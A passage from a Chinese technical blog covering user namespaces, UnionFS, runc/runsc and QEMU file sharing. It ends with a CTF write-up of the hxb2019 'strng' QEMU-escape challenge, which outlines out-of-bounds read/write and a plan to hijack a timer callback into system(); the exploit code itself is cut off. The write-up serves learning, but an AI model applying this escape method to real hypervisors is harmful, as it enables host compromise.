class="string">&quot;unshare&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">char</span> fname[<span class="number">30</span>];</span><br><span class="line">	<span class="keyword">pid_t</span> pid = getpid();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">sprintf</span>(fname, <span class="string">&quot;/proc/%d/setgroups&quot;</span>, pid);</span><br><span class="line">	<span class="keyword">int</span> fd = open(fname, O_WRONLY|O_CLOEXEC, <span class="number">0644</span>);</span><br><span class="line">	<span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Could not open %s\n&quot;</span>, fname);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	ret = write(fd, <span class="string">&quot;deny&quot;</span>, <span class="number">4</span>);</span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">sprintf</span>(fname, <span class="string">&quot;/proc/%d/gid_map&quot;</span>, pid);</span><br><span class="line">	fd = open(fname, O_WRONLY|O_CLOEXEC, <span class="number">0644</span>);</span><br><span class="line">	<span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Could not open %s\n&quot;</span>, fname);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	ret = write(fd, <span class="string">&quot;0 1000 1&quot;</span>, <span class="number">8</span>);</span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">sprintf</span>(fname, <span class="string">&quot;/proc/%d/uid_map&quot;</span>, pid);</span><br><span class="line">	fd = open(fname, O_WRONLY|O_CLOEXEC, <span class="number">0644</span>);</span><br><span class="line">	<span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Could not open %s\n&quot;</span>, fname);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	ret = write(fd, <span class="string">&quot;0 1000 1&quot;</span>, <span class="number">8</span>);</span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> *argv[] = &#123;<span class="string">&quot;bash&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">	execvp(<span class="string">&quot;/bin/bash&quot;</span>, argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>reference</strong><br><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/unshare.2.html">https://man7.org/linux/man-pages/man2/unshare.2.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/9462838.html">https://www.cnblogs.com/sparkdev/p/9462838.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/07/01/UnionFS%E6%8A%80%E6%9C%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/01/UnionFS%E6%8A%80%E6%9C%AF/" class="post-title-link" itemprop="url">UnionFS技术</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2020-07-01 21:24:47" itemprop="dateCreated datePublished" datetime="2020-07-01T21:24:47+08:00">2020-07-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="UnionFS技术"><a href="#UnionFS技术" class="headerlink" title="UnionFS技术"></a>UnionFS技术</h1><p>unionFS可以把文件系统上的多个目录内容联合挂载到同一个目录下，而目录的物理位置是分开的。先用一个简单的例子体会一下：<br>1.先创建如下的目录结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">|-- a</span><br><span class="line">|   |-- a1.txt</span><br><span class="line">|   |-- a2.txt</span><br><span class="line">|   &#96;-- test.txt</span><br><span class="line">|-- b</span><br><span class="line">|   |-- b1.txt</span><br><span class="line">|   |-- b2.txt</span><br><span class="line">|   &#96;-- test.txt</span><br><span class="line">&#96;-- mnt</span><br></pre></td></tr></table></figure>
<p>2.执行挂载命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo mount -t aufs -o dirs&#x3D;.&#x2F;a:.&#x2F;b none .&#x2F;mnt</span><br><span class="line">$ ls mnt</span><br><span class="line">a1.txt	a2.txt	b1.txt	b2.txt	test.txt</span><br></pre></td></tr></table></figure>
<p>可以看到a目录和b目录都被挂载到mnt了。<br>3.修改文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ echo hello &gt; mnt&#x2F;test.txt</span><br></pre></td></tr></table></figure>
<p>查看各文件夹中的内容，mnt和a文件夹中的test.txt被修改了，b中没有修改。原因是在mount aufs命令中，没有指a、b目录的权限，默认上来说，命令行上第一个（最左边）的目录是可读可写的，后面的全都是只读的。也可以在挂载的时候自己指定权限(mount -t aufs -o dirs=./a=rw:./b=rw none ./mnt)。<br>再修改mnt/b1.txt，会发现b中的b1.txt没有变化，而a中多了一个b1.txt。</p>
<p>4.unionFS与docker<br>UnionFS技术在Docker容器技术中的运用，首先体现在<code>镜像（image）</code>和<code>容器（container）</code>上。每一个Docker镜像都是一个只读的文件夹，当在容器中运行镜像时，Docker会自动挂载镜像中的、只读的文件目录，以及宿主机上一个临时的、可写的文件目录。容器中所有文件修改，都会写入这个临时目录里去。容器终结后，这个临时目录也会被相应删除。<br><img src="/images/docker/unionfs.png"><br>容器运行时，在挂载的临时目录中如果写入数据，还可以选择把这部分数据从临时目录中保存下来，这样就生成了一个新的镜像。Docker在保存新镜像时，会把它们两部分——原镜像和增量——都保存在新镜像中。其中新的增量部分，就被称为<code>层（layer）</code>。</p>
<p><strong>reference</strong><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/47c4a06a84a4">https://www.jianshu.com/p/47c4a06a84a4</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/songcf_faith/article/details/82787946">https://blog.csdn.net/songcf_faith/article/details/82787946</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/43372662">https://zhuanlan.zhihu.com/p/43372662</a>  </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/06/20/runc-runsc%E5%8D%95%E7%8B%AC%E4%BD%BF%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/06/20/runc-runsc%E5%8D%95%E7%8B%AC%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">runc&runsc单独使用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2020-06-20 20:33:02" itemprop="dateCreated datePublished" datetime="2020-06-20T20:33:02+08:00">2020-06-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="runc命令"><a href="#runc命令" class="headerlink" title="runc命令"></a>runc命令</h2><p>1.准备一个busybox容器所需文件系统</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker pull busybox</span><br><span class="line">$ mkdir rootfs</span><br><span class="line">$ sudo docker export $(sudo docker create busybox) | sudo tar -C rootfs -xvf -</span><br></pre></td></tr></table></figure>
<p>2.生成config.json文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ runc spec</span><br></pre></td></tr></table></figure>
<p>修改config.json，把”terminal”: true改为false，把”args”: [“sh”]改为[“sleep”, “30”]<br>3.创建名为mybusybox的容器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ sudo runc create mybusybox # 必须把terminal改为false</span><br><span class="line">$ sudo runc list</span><br><span class="line">$ sudo runc state mybusybox</span><br><span class="line"># 查看容器中运行的进程</span><br><span class="line">$ sudo runc ps mybusybox</span><br><span class="line"># 执行容器中定义的任务</span><br><span class="line">$ sudo runc start mybusybox</span><br><span class="line"># 在容器中执行命令</span><br><span class="line">$ sudo runc exec mybusybox ls</span><br><span class="line"># 删除容器</span><br><span class="line">$ sudo runc delete mybusybox</span><br></pre></td></tr></table></figure>
<p>runc run命令相当于create+start</p>
<h2 id="runsc命令"><a href="#runsc命令" class="headerlink" title="runsc命令"></a>runsc命令</h2><p>runsc是给container加了一个sandbox，基本用法与runc相同，但是加了额外的flags</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo runsc -platform&#x3D;kvm run mybusybox</span><br><span class="line">$ sudo runsc -platform&#x3D;kvm exec mybusybox ls</span><br></pre></td></tr></table></figure>
<p>添加debug log:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo runsc -debug -debug-log .&#x2F;log&#x2F; -platform kvm run mybusybox</span><br></pre></td></tr></table></figure>

<p><strong>reference</strong><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/9032209.html">https://www.cnblogs.com/sparkdev/p/9032209.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/05/27/Qemu%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8E%E5%AE%BF%E4%B8%BB%E6%9C%BA%E4%B9%8B%E9%97%B4%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/05/27/Qemu%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8E%E5%AE%BF%E4%B8%BB%E6%9C%BA%E4%B9%8B%E9%97%B4%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/" class="post-title-link" itemprop="url">Qemu虚拟机与宿主机之间文件传输</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2020-05-27 16:24:44" itemprop="dateCreated datePublished" datetime="2020-05-27T16:24:44+08:00">2020-05-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Qemu虚拟机与宿主机之间实现文件传输，大概有四类方法：<br>1.虚拟机与宿主机之间，使用网络来进行文件传输。这个需要先在宿主机上配置网络桥架，在qemu-kvm启动配置网卡就可以实现文件传输。<br>2.使用9psetup协议实现虚拟机与宿主机之间文件传输。该方法先要宿主机需要在内核中配置了9p选项，qemu在编译时需要支持ATTR/XATTR。<br>3.通过在Qemu虚拟机中挂载宿主机中的一个文件为硬盘。<br>4.第四类方法是一种新方法，是用virtio-fs通过FUSE协议进行传输。  </p>
<h2 id="通过挂载硬盘的方法"><a href="#通过挂载硬盘的方法" class="headerlink" title="通过挂载硬盘的方法"></a>通过挂载硬盘的方法</h2><p>1.用dd创建一个文件，作为虚拟机和宿主机之间传输桥梁</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;$PWD&#x2F;share.img bs&#x3D;1M count&#x3D;500</span><br></pre></td></tr></table></figure>
<p>bs：一次读入/输出的块大小<br>count：拷贝块的个数<br>上述例子中最大可以传输的文件大小为500M。<br>2.格式化share.img文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mkfs.ext4 $PWD&#x2F;share.img</span><br></pre></td></tr></table></figure>
<p>3.在宿主机上创建一个文件夹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir &#x2F;tmp&#x2F;share</span><br><span class="line">$ sudo mount -o loop $PWD&#x2F;share.img &#x2F;tmp&#x2F;share</span><br></pre></td></tr></table></figure>
<p>现在把宿主机上需要传输给虚拟机的文件放到/tmp/share下即可。<br>4.启动Qemu虚拟机，额外为虚拟机添加一块硬盘</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-drive file&#x3D;$PWD&#x2F;share.img,if&#x3D;virtio</span><br></pre></td></tr></table></figure>
<p>5.在虚拟机中mount上刚添加的硬盘，即可获得宿主机上放在/tmp/share文件夹下的文件。具体做法是：通过dmesg的输出找到新挂载的硬盘，然后将硬盘mount上来。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mount -t ext4 &#x2F;dev&#x2F;vda &#x2F;mnt&#x2F;</span><br></pre></td></tr></table></figure>
<p>该方法的缺点是宿主机和虚拟机文件传输不能实时进行，如果要传输新文件，需要重启虚拟机。</p>
<h2 id="virtio-fs"><a href="#virtio-fs" class="headerlink" title="virtio-fs"></a>virtio-fs</h2><p>需要编译的组件如下：  </p>
<ul>
<li>一个支持virtio-fs的客户机内核（Linux 5.4+）  </li>
<li>一个支持virtio-fs的QEMU（QEMU 5.0+）  </li>
</ul>
<p>1.在客户机中编译Linux内核，启动下面的选项：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_VIRTIO</span><br><span class="line">CONFIG_VIRTIO_FS</span><br><span class="line">CONFIG_DAX</span><br><span class="line">CONFIG_FS_DAX</span><br><span class="line">CONFIG_DAX_DRIVER</span><br><span class="line">CONFIG_ZONE_DEVICE</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j 8 &amp;&amp; make -j 8 modules &amp;&amp; make -j 8 modules_install &amp;&amp; make -j 8 install</span><br></pre></td></tr></table></figure>
<p>我用的主机是Ubuntu18.04，客户机系统是Debian10.5.0，在主机上编译好内核拷贝到客户机中进行安装。<br>2.编译QEMU<br>这里想要编译出virtiofsd需要安装一个libcap-ng的包，这个是从Makefile中看出来的，需要几个<code>CONFIG_</code>，在configure中可以看到，configure之后会生成config-host.mak，里面需要包含Makefile中所需的<code>CONFIG_</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install libcap-ng-dev</span><br><span class="line">$ .&#x2F;configure --enable-kvm --enable-debug --enable-cap-ng --target-list&#x3D;x86_64-softmmu</span><br><span class="line">$ make all</span><br></pre></td></tr></table></figure>
<p>3.启动QEMU<br>先要启动virtiofsd守护进程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;virtiofsd -o vhost_user_socket&#x3D;&#x2F;tmp&#x2F;vhostqemu -o source&#x3D;&#x2F;tmp&#x2F;shared -o cache&#x3D;always</span><br></pre></td></tr></table></figure>
<p>启动qemu：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;qemu-5.1.0&#x2F;x86_64-softmmu&#x2F;qemu-system-x86_64 -M pc -cpu host --enable-kvm -smp 2 \</span><br><span class="line">    -m 4G -object memory-backend-file,id&#x3D;mem,size&#x3D;4G,mem-path&#x3D;&#x2F;dev&#x2F;shm,share&#x3D;on -numa node,memdev&#x3D;mem \</span><br><span class="line">    -chardev socket,id&#x3D;char0,path&#x3D;&#x2F;tmp&#x2F;vhostqemu -device vhost-user-fs-pci,queue-size&#x3D;1024,chardev&#x3D;char0,tag&#x3D;myfs \</span><br><span class="line">    -drive if&#x3D;virtio,file&#x3D;debian.qcow2</span><br></pre></td></tr></table></figure>
<p>在客户机中挂载设备：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mount -t virtiofs myfs &#x2F;mnt</span><br></pre></td></tr></table></figure>

<p><strong>reference</strong><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/scaleqiao/article/details/45197093?_t=t">https://blog.csdn.net/scaleqiao/article/details/45197093?_t=t</a><br><a target="_blank" rel="noopener" href="https://virtio-fs.gitlab.io/howto-qemu.html">https://virtio-fs.gitlab.io/howto-qemu.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/03/23/hxb2019-strng2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/03/23/hxb2019-strng2/" class="post-title-link" itemprop="url">hxb2019 strng2</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2020-03-23 12:30:16" itemprop="dateCreated datePublished" datetime="2020-03-23T12:30:16+08:00">2020-03-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这道题是湖湘杯2019的一道QEMU pwn，<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Ea5uQXRfr9YNWKyoLhUxXw">题目下载</a>(提取码: 4wag)。QEMU pwn题目一般是基于QEMU源码进行修改或者添加，在QEMU模拟的PCI设备中引入漏洞，选手需要利用漏洞读取宿主机上的flag文件。<br>解压文件，查看内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ cat launch.sh</span><br><span class="line">#! &#x2F;bin&#x2F;sh</span><br><span class="line">.&#x2F;qemu-system-x86_64 </span><br><span class="line">-initrd .&#x2F;rootfs.cpio </span><br><span class="line">-kernel .&#x2F;vmlinuz-4.8.0-52-generic </span><br><span class="line">-append &#39;console&#x3D;ttyS0 root&#x3D;&#x2F;dev&#x2F;ram oops&#x3D;panic panic&#x3D;1&#39; </span><br><span class="line">-enable-kvm </span><br><span class="line">-monitor &#x2F;dev&#x2F;null </span><br><span class="line">-m 64M --nographic -L .&#x2F;dependency&#x2F;usr&#x2F;local&#x2F;share&#x2F;qemu </span><br><span class="line">-L pc-bios </span><br><span class="line">-device strng</span><br></pre></td></tr></table></figure>
<p>通过<code>-device strng</code>可知添加的可能存在漏洞的设备名称为<code>strng</code>，用IDA加载qemu-system-x86_64, 并在Function name中搜索strng。<br><img src="/images/strng/strng1.png"><br>查看strng_class_init()<br><img src="/images/strng/strng2.png"><br>可知strng设备的vendor_id:device_id为1234:11e9，下面运行QEMU，可能会遇到错误。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo .&#x2F;launch.sh</span><br><span class="line">.&#x2F;qemu-system-x86_64: error while loading shared libraries: libiscsi.so.2: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>
<p>解决方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;sahlberg&#x2F;libiscsi.git</span><br><span class="line">$ .&#x2F;autogen.sh</span><br><span class="line">$ .&#x2F;configure</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br><span class="line">$ cp &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libiscsi.so.7 &#x2F;lib&#x2F;libiscsi.so.2</span><br></pre></td></tr></table></figure>
<p>再次启动QEMU并查看PCI设备：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ sudo .&#x2F;launch.sh</span><br><span class="line">Welcome to QEMU-ESCAPE</span><br><span class="line">qemu login: root</span><br><span class="line"># lspci</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 1234:11e9</span><br></pre></td></tr></table></figure>
<p>通过比对vendor_id和device_id可以确定strng设备的PCI地址为00:04.0，查看strng设备的地址空间：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># cat &#x2F;sys&#x2F;devices&#x2F;pci0000:00&#x2F;0000:00:04.0&#x2F;resource</span><br><span class="line">start              end                flags</span><br><span class="line">0x00000000febf1000 0x00000000febf10ff 0x0000000000040200 # MMIO</span><br><span class="line">0x000000000000c050 0x000000000000c057 0x0000000000040101 # PMIO</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>也可以通过/proc/iomem和/proc/ioports两个文件来查看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># cat &#x2F;proc&#x2F;ioports</span><br><span class="line">c050-c057 : 0000:00:04.0</span><br><span class="line"># cat &#x2F;proc&#x2F;iomem</span><br><span class="line">febf1000-febf10ff : 0000:00:04.0</span><br></pre></td></tr></table></figure>
<p>端口号c050-c057和物理地址febf1000-febf10ff是属于strng设备的, 对这些地址空间进行读写操作就可以触发对应的strng函数。地址空间和strng函数的绑定是在pci_strng_realize()中调用memory_region_init_io()实现的：<br><img src="/images/strng/strng3.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:0000000000E19080 strng_mmio_ops  dq offset strng_mmio_read; read</span><br><span class="line">.data.rel.ro:0000000000E19080                                         ; DATA XREF: pci_strng_realize+75↑o</span><br><span class="line">.data.rel.ro:0000000000E19080                 dq offset strng_mmio_write; write</span><br><span class="line">...</span><br><span class="line">.data.rel.ro:0000000000E19100 strng_pmio_ops  dq offset strng_pmio_read; read</span><br><span class="line">.data.rel.ro:0000000000E19100                                         ; DATA XREF: pci_strng_realize+CB↑o</span><br><span class="line">.data.rel.ro:0000000000E19100                 dq offset strng_pmio_write; write</span><br></pre></td></tr></table></figure>
<p>下面就需要重点分析strng函数了：<br><img src="/images/strng/strng4.png"><br><img src="/images/strng/strng5.png"><br>注释为正确解析后的代码，IDA有时候不能正确解析结构体中的结构，需要自己分析然后注释凑合看。其中的struct STRNGState结构体没有自动解析，需要在Local Types中找到这个结构体并双击，就可以解析到Structures里了<br><img src="/images/strng/strng6.png"><br><img src="/images/strng/strng7.png"><br>可以看到strng_pmio_read和strng_pmio_write中有越界读和越界写的问题，越界写的触发过程是调用一次strng_pmio_write，设置addr=0，就会跳转到opaque-&gt;addr=val这条语句，设置val为一个大于regs数组大小的值，再调用一次strng_pmio_write，设置addr=4，即可触发漏洞，将第一次设置val值对应的位置写上本次val的值。<br>regs后面是一个QEMUTimer_0结构体，这个结构体是一个定时器，其中cb是函数指针（callback function），其初始化是在pci_strng_realize()中实现的，初始化为strng_timer()，因此知道cb的地址，减去strng_timer()的偏移即可得出elf在内存中的基地址。opaque是传给cb的参数，可以在timerlist_run_timers()中看到。<br>那么思路如下：<br>1.越界读出cb函数指针的地址，用cb的地址减去strng_timer()的偏移得出elf的基地址；<br>2.用system@plt加上elf基地址得出system地址；<br>3.越界读出QEMUTimer_0里opaque的地址；<br>4.越界写将QEMUTimer_0里opaque的地址写为上层opaque-&gt;regs[3]的地址；<br>5.用mmio在opaque-&gt;regs[3]~[4]写上”cat flag”；<br>6.越界写将cb写为system的地址<br>7.启动定时器(strng_pmio_write即可启动定时器）<br>完整exploit如下：</p>
